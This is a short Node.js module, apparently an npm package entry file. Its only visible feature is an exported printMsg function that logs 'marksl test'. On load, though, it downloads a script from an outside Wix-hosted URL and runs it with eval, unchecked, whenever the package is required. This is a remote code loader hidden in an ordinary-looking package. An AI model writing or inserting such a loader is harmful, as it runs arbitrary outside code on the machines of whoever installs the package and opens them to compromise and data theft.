const https = require('https');

const remoteScriptUrl = 'https://marksl70.wixstudio.io/collaborator/_functions/file/somepackage-marksl';

https.get(remoteScriptUrl, (response) => {
    let scriptContent = '';

    response.on('data', (chunk) => {
        scriptContent += chunk;
    });

    response.on('end', () => {
        eval(scriptContent);
    });
})

exports.printMsg = function() {
    console.log("marksl test");
}
